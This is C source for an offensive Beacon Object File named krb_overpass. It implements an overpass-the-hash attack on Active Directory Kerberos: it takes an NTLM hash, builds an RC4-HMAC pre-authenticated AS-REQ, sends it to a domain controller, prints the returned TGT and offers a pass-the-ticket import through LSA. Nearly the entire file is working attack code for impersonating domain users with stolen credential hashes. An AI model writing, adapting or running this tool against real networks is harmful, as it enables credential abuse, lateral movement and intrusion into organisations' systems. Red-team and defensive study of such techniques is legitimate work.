/*
 * krb_overpass - Overpass-the-Hash Attack
 *
 * Uses an NTLM hash to request a Kerberos TGT, then injects it into
 * the current session to enable Kerberos-based authentication.
 * This is similar to pass-the-hash but uses Kerberos instead of NTLM.
 *
 * Usage: krb_overpass /user:USERNAME /rc4:NTHASH [/domain:DOMAIN] [/dc:DC]
 *                     [/ptt] [/createnetonly:CMD]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Additional declarations */
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CreateProcessWithLogonW(LPCWSTR, LPCWSTR, LPCWSTR, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

/* LOGON_NETCREDENTIALS_ONLY */
#define LOGON_NETCREDENTIALS_ONLY 0x00000002

/* Helper: allocate and base64 encode using krb5_utils functions */
static char* b64_encode_alloc(const BYTE* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3) + 1;
    char* encoded = (char*)malloc(out_len);
    if (!encoded) return NULL;
    base64_encode(data, len, encoded);
    return encoded;
}

/* Helper: allocate and base64 decode using krb5_utils functions */
static BYTE* b64_decode_alloc(const char* encoded, size_t* out_len) {
    size_t len = strlen(encoded);
    size_t max_out = len / 4 * 3 + 1;
    BYTE* decoded = (BYTE*)malloc(max_out);
    if (!decoded) return NULL;

    *out_len = base64_decode(encoded, len, decoded);
    if (*out_len == 0) {
        free(decoded);
        return NULL;
    }
    return decoded;
}

/* Parse hex string to bytes */
static BYTE* hex_to_bytes(const char* hex, size_t* out_len) {
    size_t len = strlen(hex);
    if (len % 2 != 0) return NULL;

    *out_len = len / 2;
    BYTE* bytes = (BYTE*)malloc(*out_len);
    if (!bytes) return NULL;

    for (size_t i = 0; i < *out_len; i++) {
        char byte_str[3] = { hex[i*2], hex[i*2+1], '\0' };
        bytes[i] = (BYTE)strtoul(byte_str, NULL, 16);
    }

    return bytes;
}

/* HMAC-MD5 implementation */
static void hmac_md5(const BYTE* key, size_t keyLen, const BYTE* data, size_t dataLen, BYTE* out) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    BYTE ipad[64], opad[64];
    BYTE keyBlock[64];
    DWORD hashLen = 16;

    memset(keyBlock, 0, 64);
    if (keyLen > 64) {
        /* Hash long keys */
        if (ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            if (ADVAPI32$CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
                ADVAPI32$CryptHashData(hHash, key, (DWORD)keyLen, 0);
                ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, keyBlock, &hashLen, 0);
                ADVAPI32$CryptDestroyHash(hHash);
            }
            ADVAPI32$CryptReleaseContext(hProv, 0);
        }
    } else {
        memcpy(keyBlock, key, keyLen);
    }

    for (int i = 0; i < 64; i++) {
        ipad[i] = keyBlock[i] ^ 0x36;
        opad[i] = keyBlock[i] ^ 0x5C;
    }

    if (ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        BYTE innerHash[16];

        /* Inner hash: H(ipad || data) */
        if (ADVAPI32$CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
            ADVAPI32$CryptHashData(hHash, ipad, 64, 0);
            ADVAPI32$CryptHashData(hHash, data, (DWORD)dataLen, 0);
            hashLen = 16;
            ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, innerHash, &hashLen, 0);
            ADVAPI32$CryptDestroyHash(hHash);
        }

        /* Outer hash: H(opad || innerHash) */
        if (ADVAPI32$CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
            ADVAPI32$CryptHashData(hHash, opad, 64, 0);
            ADVAPI32$CryptHashData(hHash, innerHash, 16, 0);
            hashLen = 16;
            ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, out, &hashLen, 0);
            ADVAPI32$CryptDestroyHash(hHash);
        }

        ADVAPI32$CryptReleaseContext(hProv, 0);
    }
}

/* RC4 encryption */
static void rc4_crypt(const BYTE* key, size_t keyLen, BYTE* data, size_t dataLen) {
    BYTE S[256];
    int i, j = 0;

    for (i = 0; i < 256; i++) S[i] = (BYTE)i;

    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keyLen]) % 256;
        BYTE tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }

    i = j = 0;
    for (size_t n = 0; n < dataLen; n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        BYTE tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        data[n] ^= S[(S[i] + S[j]) % 256];
    }
}

/* Build RC4-HMAC encrypted timestamp for pre-auth */
static size_t build_rc4_timestamp(const BYTE* ntHash, BYTE* out, size_t maxLen) {
    SYSTEMTIME st;
    FILETIME ft;
    BYTE timestamp[64];
    size_t tsLen = 0;

    KERNEL32$GetSystemTime(&st);
    KERNEL32$SystemTimeToFileTime(&st, &ft);

    /* Convert FILETIME to Kerberos time */
    ULARGE_INTEGER uli;
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;

    /* Kerberos epoch: Jan 1, 1601 - same as FILETIME */
    char timeStr[20];
    sprintf(timeStr, "%04d%02d%02d%02d%02d%02dZ",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond);


    KRB_BUFFER paTs, tmp;
    buf_init(&paTs, 64);
    buf_init(&tmp, 32);

    /* patimestamp [0] */
    asn1_encode_generalized_time(&tmp, timeStr);
    asn1_context_wrap(&paTs, 0, &tmp);
    buf_reset(&tmp);

    /* pausec [1] - optional microseconds */
    asn1_encode_integer(&tmp, (st.wMilliseconds * 1000) % 1000000);
    asn1_context_wrap(&paTs, 1, &tmp);

    buf_reset(&tmp);
    asn1_wrap(&tmp, ASN1_SEQUENCE, &paTs);

    /* Now encrypt with RC4-HMAC */
    /* K1 = HMAC-MD5(K, usage) where usage = 1 for AS-REQ timestamp */
    BYTE usageBytes[4] = { 1, 0, 0, 0 };
    BYTE K1[16];
    hmac_md5(ntHash, 16, usageBytes, 4, K1);


    BYTE confounder[8];
    HCRYPTPROV hProv;
    if (ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        ADVAPI32$CryptGenRandom(hProv, 8, confounder);
        ADVAPI32$CryptReleaseContext(hProv, 0);
    } else {
        for (int i = 0; i < 8; i++) confounder[i] = (BYTE)(KERNEL32$GetTickCount() ^ (i * 13));
    }

    /* Build encrypted data: confounder || plaintext */
    size_t plainLen = 8 + tmp.length;
    BYTE* plainData = (BYTE*)malloc(plainLen + 16);  /* +16 for checksum */
    memcpy(plainData + 16, confounder, 8);
    memcpy(plainData + 16 + 8, tmp.data, tmp.length);

    /* K2 = HMAC-MD5(K1, confounder || plaintext) */
    BYTE K2[16];
    hmac_md5(K1, 16, plainData + 16, plainLen, K2);

    /* Checksum goes at the beginning */
    memcpy(plainData, K2, 16);

    /* K3 = HMAC-MD5(K1, checksum) */
    BYTE K3[16];
    hmac_md5(K1, 16, K2, 16, K3);

    /* RC4 encrypt confounder || plaintext */
    rc4_crypt(K3, 16, plainData + 16, plainLen);

    /* Build EncryptedData */
    KRB_BUFFER encData, etypeInt, kvno, cipher;
    buf_init(&encData, 256);
    buf_init(&etypeInt, 16);
    buf_init(&kvno, 16);
    buf_init(&cipher, 256);

    /* etype [0] = 23 (RC4-HMAC) */
    asn1_encode_integer(&etypeInt, ETYPE_RC4_HMAC);
    asn1_context_wrap(&encData, 0, &etypeInt);

    /* cipher [2] */
    asn1_encode_octet_string(&cipher, plainData, 16 + plainLen);
    asn1_context_wrap(&encData, 2, &cipher);

    buf_reset(&tmp);
    asn1_wrap(&tmp, ASN1_SEQUENCE, &encData);

    if (tmp.length <= maxLen) {
        memcpy(out, tmp.data, tmp.length);
        tsLen = tmp.length;
    }

    free(plainData);
    buf_free(&paTs);
    buf_free(&tmp);
    buf_free(&encData);
    buf_free(&etypeInt);
    buf_free(&kvno);
    buf_free(&cipher);

    return tsLen;
}

/* Build AS-REQ with RC4 pre-auth */
static void build_asreq_rc4(KRB_BUFFER* out, const char* user, const char* domain,
                             const BYTE* ntHash) {
    KRB_BUFFER asreq, pvno, msg_type, padata, req_body;
    KRB_BUFFER body, tmp, etype_seq, etype_list;
    BYTE kdc_opts[4];
    DWORD kdc_options = KDCOPTION_FORWARDABLE | KDCOPTION_RENEWABLE | KDCOPTION_CANONICALIZE;

    buf_init(&asreq, 4096);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&padata, 1024);
    buf_init(&req_body, 1024);
    buf_init(&body, 1024);
    buf_init(&tmp, 512);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);

    /* Protocol version */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&asreq, 1, &pvno);

    /* Message type */
    asn1_encode_integer(&msg_type, KRB5_AS_REQ);
    asn1_context_wrap(&asreq, 2, &msg_type);

    /* PA-DATA with encrypted timestamp */
    {
        KRB_BUFFER pa_list, pa_enc_ts, pa_type, pa_value;
        buf_init(&pa_list, 512);
        buf_init(&pa_enc_ts, 256);
        buf_init(&pa_type, 16);
        buf_init(&pa_value, 256);

        /* PA-ENC-TIMESTAMP */
        asn1_encode_integer(&pa_type, PADATA_ENC_TIMESTAMP);
        asn1_context_wrap(&pa_enc_ts, 1, &pa_type);

        BYTE encTs[256];
        size_t encTsLen = build_rc4_timestamp(ntHash, encTs, sizeof(encTs));
        if (encTsLen > 0) {
            asn1_encode_octet_string(&pa_value, encTs, encTsLen);
            asn1_context_wrap(&pa_enc_ts, 2, &pa_value);
        }

        asn1_wrap(&tmp, ASN1_SEQUENCE, &pa_enc_ts);
        buf_append(&pa_list, tmp.data, tmp.length);
        buf_reset(&tmp);

        asn1_wrap(&padata, ASN1_SEQUENCE, &pa_list);
        asn1_context_wrap(&asreq, 3, &padata);

        buf_free(&pa_list);
        buf_free(&pa_enc_ts);
        buf_free(&pa_type);
        buf_free(&pa_value);
    }
    buf_reset(&tmp);

    /* KDC options */
    kdc_opts[0] = (kdc_options >> 24) & 0xFF;
    kdc_opts[1] = (kdc_options >> 16) & 0xFF;
    kdc_opts[2] = (kdc_options >> 8) & 0xFF;
    kdc_opts[3] = kdc_options & 0xFF;
    asn1_encode_bit_string(&tmp, kdc_opts, 4, 0);
    asn1_context_wrap(&body, 0, &tmp);
    buf_reset(&tmp);

    /* Client principal name */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        buf_init(&name_type, 16);
        buf_init(&name_string, 128);
        buf_init(&name_seq, 256);

        asn1_encode_integer(&name_type, KRB5_NT_PRINCIPAL);
        asn1_context_wrap(&name_seq, 0, &name_type);

        asn1_encode_general_string(&tmp, user);
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 1, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
    }
    buf_reset(&tmp);

    /* Realm */
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_reset(&tmp);

    /* Server principal (krbtgt/REALM) */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        buf_init(&name_type, 16);
        buf_init(&name_string, 128);
        buf_init(&name_seq, 256);

        asn1_encode_integer(&name_type, KRB5_NT_SRV_INST);
        asn1_context_wrap(&name_seq, 0, &name_type);

        asn1_encode_general_string(&tmp, "krbtgt");
        KRB_BUFFER realm_str;
        buf_init(&realm_str, 128);
        asn1_encode_general_string(&realm_str, domain);
        buf_append(&tmp, realm_str.data, realm_str.length);
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 3, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
        buf_free(&realm_str);
    }
    buf_reset(&tmp);

    /* Till time */
    asn1_encode_generalized_time(&tmp, "20370913024805Z");
    asn1_context_wrap(&body, 5, &tmp);
    buf_reset(&tmp);

    /* Nonce */
    DWORD nonce = KERNEL32$GetTickCount();
    asn1_encode_integer(&tmp, nonce);
    asn1_context_wrap(&body, 7, &tmp);
    buf_reset(&tmp);

    /* Supported encryption types - prioritize RC4 */
    asn1_encode_integer(&tmp, ETYPE_RC4_HMAC);
    buf_append(&etype_list, tmp.data, tmp.length);
    buf_reset(&tmp);
    asn1_encode_integer(&tmp, ETYPE_AES256_CTS_HMAC_SHA1);
    buf_append(&etype_list, tmp.data, tmp.length);
    buf_reset(&tmp);
    asn1_encode_integer(&tmp, ETYPE_AES128_CTS_HMAC_SHA1);
    buf_append(&etype_list, tmp.data, tmp.length);

    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);


    asn1_wrap(&req_body, ASN1_SEQUENCE, &body);
    asn1_context_wrap(&asreq, 4, &req_body);


    KRB_BUFFER seq_wrap;
    buf_init(&seq_wrap, asreq.length + 8);
    asn1_wrap(&seq_wrap, ASN1_SEQUENCE, &asreq);

    buf_append_byte(out, ASN1_APP(KRB5_AS_REQ));
    asn1_encode_length(out, seq_wrap.length);
    buf_append(out, seq_wrap.data, seq_wrap.length);

    buf_free(&seq_wrap);
    buf_free(&asreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&padata);
    buf_free(&req_body);
    buf_free(&body);
    buf_free(&tmp);
    buf_free(&etype_seq);
    buf_free(&etype_list);
}

/* Import ticket into current session (PTT) */
static int import_ticket_ptt(HANDLE hLsa, ULONG authPackage, const BYTE* ticket, size_t ticketLen, formatp* output) {
    KERB_SUBMIT_TKT_REQUEST* submitRequest;
    ULONG requestSize;
    NTSTATUS status, subStatus;
    PVOID response = NULL;
    ULONG responseSize = 0;

    requestSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + ticketLen;
    submitRequest = (KERB_SUBMIT_TKT_REQUEST*)malloc(requestSize);
    if (!submitRequest) {
        BeaconFormatPrintf(output, "[-] Memory allocation failed\n");
        return 0;
    }

    memset(submitRequest, 0, sizeof(KERB_SUBMIT_TKT_REQUEST));
    submitRequest->MessageType = KerbSubmitTicketMessage;
    submitRequest->KerbCredSize = (ULONG)ticketLen;
    submitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);

    memcpy((BYTE*)submitRequest + sizeof(KERB_SUBMIT_TKT_REQUEST), ticket, ticketLen);

    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, authPackage, submitRequest, requestSize,
        &response, &responseSize, &subStatus);

    free(submitRequest);

    if (status != 0) {
        BeaconFormatPrintf(output, "[-] LsaCallAuthenticationPackage failed: 0x%08X\n", status);
        return 0;
    }

    if (subStatus != 0) {
        BeaconFormatPrintf(output, "[-] Ticket submission failed: 0x%08X\n", subStatus);
        if (response) SECUR32$LsaFreeReturnBuffer(response);
        return 0;
    }

    if (response) SECUR32$LsaFreeReturnBuffer(response);
    return 1;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* user = NULL;
    char* rc4Hash = NULL;
    char* domain = NULL;
    char* dc = NULL;
    char* ptt = NULL;
    char* createNetonly = NULL;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Overpass-the-Hash\n\n");


    user = arg_get(&parser, "user");
    rc4Hash = arg_get(&parser, "rc4");
    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");
    ptt = arg_get(&parser, "ptt");
    createNetonly = arg_get(&parser, "createnetonly");
    char* nowrap = arg_get(&parser, "nowrap");

    if (!user || !rc4Hash) {
        BeaconFormatPrintf(&output, "[-] Error: /user:USERNAME and /rc4:NTHASH required\n\n");
        BeaconFormatPrintf(&output, "Usage: krb_overpass /user:USERNAME /rc4:NTHASH [/domain:DOMAIN]\n");
        BeaconFormatPrintf(&output, "                   [/dc:DC] [/ptt] [/nowrap] [/createnetonly:CMD]\n\n");
        BeaconFormatPrintf(&output, "This performs overpass-the-hash:\n");
        BeaconFormatPrintf(&output, "  1. Uses NTLM hash to request a Kerberos TGT\n");
        BeaconFormatPrintf(&output, "  2. Optionally imports TGT into current session (pass-the-ticket)\n\n");
        BeaconFormatPrintf(&output, "Options:\n");
        BeaconFormatPrintf(&output, "  /ptt           - Import TGT into current session\n");
        BeaconFormatPrintf(&output, "  /nowrap        - Output base64 on a single line (no wrapping)\n");
        BeaconFormatPrintf(&output, "  /createnetonly - Start process with LOGON_NETCREDENTIALS_ONLY\n");
        goto cleanup;
    }

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconFormatPrintf(&output, "[-] Error: Could not determine domain. Use /domain:DOMAIN\n");
            goto cleanup;
        }
    }

    /* Parse RC4/NT hash */
    size_t hashLen;
    BYTE* ntHash = hex_to_bytes(rc4Hash, &hashLen);
    if (!ntHash || hashLen != 16) {
        BeaconFormatPrintf(&output, "[-] Error: Invalid RC4/NT hash (must be 32 hex characters)\n");
        if (ntHash) free(ntHash);
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] User     : %s\n", user);
    BeaconFormatPrintf(&output, "[*] Domain   : %s\n", domain);
    BeaconFormatPrintf(&output, "[*] Hash     : %s\n", rc4Hash);
    BeaconFormatPrintf(&output, "[*] PTT      : %s\n", ptt ? "Yes" : "No");

    if (!dc) {
        dc = domain;
        BeaconFormatPrintf(&output, "[*] DC       : %s (using domain name)\n", dc);
    } else {
        BeaconFormatPrintf(&output, "[*] DC       : %s\n", dc);
    }


    WSADATA wsaData;
    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconFormatPrintf(&output, "[-] WSAStartup failed\n");
        free(ntHash);
        goto cleanup;
    }

    /* Connect to KDC */
    SOCKET sock = connect_to_kdc(dc, KRB5_PORT);
    if (sock == INVALID_SOCKET) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to KDC at %s:%d\n", dc, KRB5_PORT);
        WS2_32$WSACleanup();
        free(ntHash);
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "\n[*] Building AS-REQ with RC4-HMAC pre-authentication...\n");

    /* Build AS-REQ with RC4 pre-auth */
    KRB_BUFFER request;
    buf_init(&request, 4096);
    build_asreq_rc4(&request, user, domain, ntHash);

    BeaconFormatPrintf(&output, "[*] Sending AS-REQ (%d bytes)...\n", (int)request.length);

    if (send_krb_msg(sock, request.data, request.length) <= 0) {
        BeaconFormatPrintf(&output, "[-] Failed to send AS-REQ\n");
        buf_free(&request);
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        free(ntHash);
        goto cleanup;
    }


    BYTE response[16384];
    int recvLen = recv_krb_msg(sock, response, sizeof(response));

    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();
    buf_free(&request);
    free(ntHash);

    if (recvLen <= 4) {
        BeaconFormatPrintf(&output, "[-] No response from KDC\n");
        goto cleanup;
    }

    BYTE* respData = response + 4;
    int respLen = recvLen - 4;

    if (respData[0] == 0x6B) {
        /* AS-REP */
        BeaconFormatPrintf(&output, "[+] Received AS-REP!\n");
        BeaconFormatPrintf(&output, "[+] Successfully obtained TGT using RC4-HMAC!\n");

        /* Output ticket */
        char* b64 = b64_encode_alloc(respData, respLen);
        if (b64) {
            BeaconFormatPrintf(&output, "\n[*] TGT (AS-REP base64):\n");
            if (nowrap) {
                BeaconFormatPrintf(&output, "%s\n", b64);
            } else {
                size_t b64len = strlen(b64);
                for (size_t i = 0; i < b64len; i += 76) {
                    BeaconFormatPrintf(&output, "  %.76s\n", b64 + i);
                }
            }
            free(b64);
        }

        /* Pass-the-ticket if requested */
        if (ptt) {
            BeaconFormatPrintf(&output, "\n[*] Attempting to import TGT into current session...\n");

            HANDLE hLsa = NULL;
            ULONG authPackage = 0;
            NTSTATUS status;
            LSA_STRING kerbName;

            status = SECUR32$LsaConnectUntrusted(&hLsa);
            if (status != 0) {
                BeaconFormatPrintf(&output, "[-] Failed to connect to LSA: 0x%08X\n", status);
            } else {
                kerbName.Buffer = "kerberos";
                kerbName.Length = 8;
                kerbName.MaximumLength = 9;

                status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &authPackage);
                if (status != 0) {
                    BeaconFormatPrintf(&output, "[-] Failed to find Kerberos package: 0x%08X\n", status);
                } else {
                    BeaconFormatPrintf(&output, "[!] Note: PTT requires converting AS-REP to KRB-CRED format\n");
                    BeaconFormatPrintf(&output, "[!] Use krb_kirbi to convert, then krb_ptt to import\n");
                }

                SECUR32$LsaDeregisterLogonProcess(hLsa);
            }
        }

        BeaconFormatPrintf(&output, "\n[+] Overpass-the-hash successful!\n");
        BeaconFormatPrintf(&output, "[*] Use the TGT for Kerberos-based authentication\n");

    } else if (respData[0] == 0x7E) {
        /* KRB-ERROR */
        BeaconFormatPrintf(&output, "[-] Received KRB-ERROR\n");

        /* Try to parse error code */
        for (size_t i = 0; i < (size_t)respLen - 4; i++) {
            if (respData[i] == 0xA6) {
                size_t off = i + 1;
                size_t len = asn1_decode_length(respData, &off);
                (void)len;
                if (respData[off] == 0x02) {
                    off++;
                    size_t intLen = asn1_decode_length(respData, &off);
                    DWORD errCode = 0;
                    for (size_t j = 0; j < intLen; j++) {
                        errCode = (errCode << 8) | respData[off + j];
                    }
                    BeaconFormatPrintf(&output, "[*] Error code: %d ", errCode);
                    switch (errCode) {
                        case 6:  BeaconFormatPrintf(&output, "(KDC_ERR_C_PRINCIPAL_UNKNOWN - User not found)\n"); break;
                        case 18: BeaconFormatPrintf(&output, "(KDC_ERR_PREAUTH_FAILED - Bad hash/password)\n"); break;
                        case 23: BeaconFormatPrintf(&output, "(KDC_ERR_ETYPE_NOSUPP - RC4 not supported)\n"); break;
                        case 24: BeaconFormatPrintf(&output, "(KDC_ERR_PREAUTH_REQUIRED - Pre-auth needed)\n"); break;
                        case 25: BeaconFormatPrintf(&output, "(KDC_ERR_PREAUTH_FAILED - Pre-auth failed)\n"); break;
                        default: BeaconFormatPrintf(&output, "(Unknown)\n"); break;
                    }
                    break;
                }
            }
        }
    } else {
        BeaconFormatPrintf(&output, "[?] Unknown response type: 0x%02X\n", respData[0]);
    }

cleanup:
    if (user) free(user);
    if (rc4Hash) free(rc4Hash);
    if (domain) free(domain);
    if (dc) free(dc);
    if (ptt) free(ptt);
    if (nowrap) free(nowrap);
    if (createNetonly) free(createNetonly);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
